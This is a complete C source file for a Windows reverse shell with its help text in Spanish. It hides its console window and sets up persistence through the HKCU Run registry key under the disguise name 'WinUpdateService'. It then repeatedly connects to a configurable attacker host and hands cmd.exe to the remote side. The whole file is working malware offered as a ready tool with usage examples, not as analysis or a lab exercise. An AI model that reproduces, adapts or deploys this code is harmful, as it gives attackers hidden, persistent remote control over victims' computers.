#include <winsock2.h>
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <ws2tcpip.h>
#pragma comment(lib, "ws2_32.lib")

// Configuración por defecto
char ATTACKER_HOST[256] = "192.168.1.100";
int ATTACKER_PORT = 4444;
int RECONNECT_DELAY = 5000;
char SERVICE_NAME[256] = "WinUpdateService";
BOOL ENABLE_PERSISTENCE = TRUE;

void establish_persistence() {
  HKEY hKey;
  char path[MAX_PATH];
  
  GetModuleFileName(NULL, path, MAX_PATH);
  
  if(RegOpenKeyEx(HKEY_CURRENT_USER, 
          "Software\\Microsoft\\Windows\\CurrentVersion\\Run",
          0, KEY_WRITE, &hKey) == ERROR_SUCCESS) {
    RegSetValueEx(hKey, SERVICE_NAME, 0, REG_SZ, 
           (BYTE*)path, strlen(path)+1);
    RegCloseKey(hKey);
    printf("[+] Persistencia establecida como: %s\n", SERVICE_NAME);
  } else {
    printf("[-] Error estableciendo persistencia\n");
  }
}

// Resolver hostname a dirección IP
char* resolve_hostname(const char* hostname) {
  static char ip_str[INET_ADDRSTRLEN];
  struct addrinfo hints, *res, *p;
  
  memset(&hints, 0, sizeof(hints));
  hints.ai_family = AF_INET;
  hints.ai_socktype = SOCK_STREAM;
  
  if (getaddrinfo(hostname, NULL, &hints, &res) != 0) {
    return NULL;
  }
  
  for (p = res; p != NULL; p = p->ai_next) {
    if (p->ai_family == AF_INET) {
      struct sockaddr_in *ipv4 = (struct sockaddr_in *)p->ai_addr;
      inet_ntop(AF_INET, &(ipv4->sin_addr), ip_str, INET_ADDRSTRLEN);
      break;
    }
  }
  
  freeaddrinfo(res);
  return (p == NULL) ? NULL : ip_str;
}

int is_valid_ip(const char* ip) {
  struct sockaddr_in sa;
  return inet_pton(AF_INET, ip, &(sa.sin_addr)) != 0;
}

int is_valid_port(int port) {
  return port > 0 && port <= 65535;
}

int is_valid_delay(int delay) {
  return delay >= 100 && delay <= 60000; // Entre 100ms y 60 segundos
}

int is_valid_service_name(const char* name) {
  return strlen(name) > 0 && strlen(name) < 256;
}

void reverse_shell() {
  WSADATA wsaData;
  SOCKET sock;
  struct sockaddr_in server;
  STARTUPINFO sinfo;
  PROCESS_INFORMATION pinfo;
  char* resolved_ip = NULL;
  
  while(1) {
    if(WSAStartup(MAKEWORD(2,2), &wsaData) != 0) {
      Sleep(RECONNECT_DELAY);
      continue;
    }
    
    // Resolver hostname si no es una IP
    if (is_valid_ip(ATTACKER_HOST)) {
      resolved_ip = ATTACKER_HOST;
    } else {
      resolved_ip = resolve_hostname(ATTACKER_HOST);
      if (!resolved_ip) {
        printf("[-] Error resolviendo hostname: %s\n", ATTACKER_HOST);
        WSACleanup();
        Sleep(RECONNECT_DELAY);
        continue;
      }
      printf("[+] Hostname resuelto: %s -> %s\n", ATTACKER_HOST, resolved_ip);
    }
    
    sock = WSASocket(AF_INET, SOCK_STREAM, IPPROTO_TCP, NULL, 0, 0);
    if(sock == INVALID_SOCKET) {
      WSACleanup();
      Sleep(RECONNECT_DELAY);
      continue;
    }
    
    server.sin_family = AF_INET;
    server.sin_port = htons(ATTACKER_PORT);
    server.sin_addr.s_addr = inet_addr(resolved_ip);
    
    printf("[+] Conectando a %s:%d...\n", resolved_ip, ATTACKER_PORT);
    
    if(WSAConnect(sock, (SOCKADDR*)&server, sizeof(server), 
          NULL, NULL, NULL, NULL) == SOCKET_ERROR) {
      printf("[-] Error de conexion, reintentando en %d ms...\n", RECONNECT_DELAY);
      closesocket(sock);
      WSACleanup();
      Sleep(RECONNECT_DELAY);
      continue;
    }
    
    printf("[+] Conexion establecida\n");
    
    memset(&sinfo, 0, sizeof(sinfo));
    sinfo.cb = sizeof(sinfo);
    sinfo.dwFlags = STARTF_USESTDHANDLES;
    sinfo.hStdInput = sinfo.hStdOutput = sinfo.hStdError = (HANDLE)sock;
    
    CreateProcess(NULL, "cmd.exe", NULL, NULL, TRUE, 
          CREATE_NO_WINDOW, NULL, NULL, &sinfo, &pinfo);
    
    WaitForSingleObject(pinfo.hProcess, INFINITE);
    
    CloseHandle(pinfo.hProcess);
    CloseHandle(pinfo.hThread);
    closesocket(sock);
    WSACleanup();
    
    printf("[+] Desconectado, reconectando en %d ms...\n", RECONNECT_DELAY);
    Sleep(RECONNECT_DELAY);
  }
}

void show_help() {
  printf("Reverse Shell Windows - Modo Persistente\n");
  printf("========================================\n");
  printf("Uso: shell.exe [-h HOST] [-p PUERTO] [-rd DELAY] [-sn NOMBRE] [-nop]\n\n");
  printf("Parametros:\n");
  printf("  -h    Host del atacante (IP o DNS) (ej: 192.168.1.100 o attacker.com)\n");
  printf("  -p    Puerto del atacante (1-65535) (default: 4444)\n");
  printf("  -rd   Delay de reconexion en ms (100-60000) (default: 5000)\n");
  printf("  -sn   Nombre del servicio para persistencia (default: WinUpdateService)\n");
  printf("  -nop  Deshabilitar persistencia\n");
  printf("  -help Mostrar esta ayuda\n\n");
  printf("Ejemplos:\n");
  printf("  shell.exe -h 10.0.0.5 -p 8080 -rd 3000\n");
  printf("  shell.exe -h attacker.mydomain.com -p 443 -nop\n");
  printf("  shell.exe -h 192.168.0.10 -p 9001 -sn \"SystemHelper\"\n");
}

void parse_args(int argc, char* argv[]) {
  for(int i = 1; i < argc; i++) {
    if((strcmp(argv[i], "-h") == 0 || strcmp(argv[i], "-host") == 0) && i + 1 < argc) {
      strncpy(ATTACKER_HOST, argv[i + 1], sizeof(ATTACKER_HOST) - 1);
      ATTACKER_HOST[sizeof(ATTACKER_HOST) - 1] = '\0';
      i++;
    } 
    else if((strcmp(argv[i], "-p") == 0 || strcmp(argv[i], "-port") == 0) && i + 1 < argc) {
      ATTACKER_PORT = atoi(argv[i + 1]);
      if (!is_valid_port(ATTACKER_PORT)) {
        printf("[-] Puerto invalido: %d. Debe estar entre 1 y 65535\n", ATTACKER_PORT);
        exit(1);
      }
      i++;
    }
    else if((strcmp(argv[i], "-rd") == 0 || strcmp(argv[i], "-delay") == 0) && i + 1 < argc) {
      RECONNECT_DELAY = atoi(argv[i + 1]);
      if (!is_valid_delay(RECONNECT_DELAY)) {
        printf("[-] Delay invalido: %d. Debe estar entre 100 y 60000 ms\n", RECONNECT_DELAY);
        exit(1);
      }
      i++;
    }
    else if((strcmp(argv[i], "-sn") == 0 || strcmp(argv[i], "-service") == 0) && i + 1 < argc) {
      strncpy(SERVICE_NAME, argv[i + 1], sizeof(SERVICE_NAME) - 1);
      SERVICE_NAME[sizeof(SERVICE_NAME) - 1] = '\0';
      if (!is_valid_service_name(SERVICE_NAME)) {
        printf("[-] Nombre de servicio invalido\n");
        exit(1);
      }
      i++;
    }
    else if(strcmp(argv[i], "-nop") == 0 || strcmp(argv[i], "-nopersist") == 0) {
      ENABLE_PERSISTENCE = FALSE;
    }
    else if(strcmp(argv[i], "-help") == 0 || strcmp(argv[i], "--help") == 0) {
      show_help();
      exit(0);
    }
    else {
      printf("[-] Parametro desconocido: %s\n", argv[i]);
      printf("[-] Usa -help para ver la ayuda\n");
      exit(1);
    }
  }
}

void validate_config() {
  printf("[+] Configuracion validada:\n");
  printf("    Host: %s\n", ATTACKER_HOST);
  printf("    Puerto: %d\n", ATTACKER_PORT);
  printf("    Delay de reconexion: %d ms\n", RECONNECT_DELAY);
  printf("    Servicio: %s\n", SERVICE_NAME);
  printf("    Persistencia: %s\n", ENABLE_PERSISTENCE ? "HABILITADA" : "DESHABILITADA");
  
  // Validar host (IP o DNS)
  if (!is_valid_ip(ATTACKER_HOST)) {
    printf("[+] Host parece ser un DNS, se intentara resolver en tiempo de conexion\n");
  }
}

int main(int argc, char* argv[]) {
  // Ocultar ventana de consola
  HWND hWnd = GetConsoleWindow();
  ShowWindow(hWnd, SW_HIDE);
  
  // Parsear argumentos
  parse_args(argc, argv);
  
  // Validar configuración
  validate_config();
  
  // Establecer persistencia si está habilitada
  if (ENABLE_PERSISTENCE) {
    establish_persistence();
  } else {
    printf("[+] Persistencia deshabilitada por parametro\n");
  }
  
  // Iniciar reverse shell con reconexión
  printf("[+] Iniciando reverse shell...\n");
  reverse_shell();
  
  return 0;
}
